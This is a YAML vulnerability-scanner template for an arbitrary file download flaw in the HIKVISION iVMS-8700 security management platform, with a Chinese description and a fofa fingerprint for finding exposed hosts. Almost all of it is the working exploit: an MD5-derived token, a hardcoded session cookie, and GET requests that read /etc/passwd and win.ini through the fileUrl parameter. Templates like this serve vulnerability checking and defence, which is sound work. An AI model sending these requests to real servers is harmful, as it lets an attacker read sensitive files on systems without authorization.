id: hikvision-ivms-8700-fileread

info:
  name: HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载
  author: peiqi
  severity: high
  verified: false
  description: |-
    HIKVISION iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息
    fofa: icon_hash="-911494769"
  reference:
    - https://mp.weixin.qq.com/s/QA5Wssyrjf3exQbPtK4Hrw
  tags: hikvision,ivms8700,fileread
  created: 2023/06/25

set:
  url: request.url.scheme+"://"+request.url.host+"/eps/api/triggerSnapshot/download"
  token: toUpper(md5(url))
rules:
  r0:
    request:
      method: GET
      path: /eps/api/triggerSnapshot/download?token={{token}}&fileUrl=file:///etc/passwd&fileName=1
      headers:
        Cookie: "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /eps/api/triggerSnapshot/download?token={{token}}&fileUrl=file:///C:/windows/win.ini&fileName=1
      headers:
        Cookie: "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
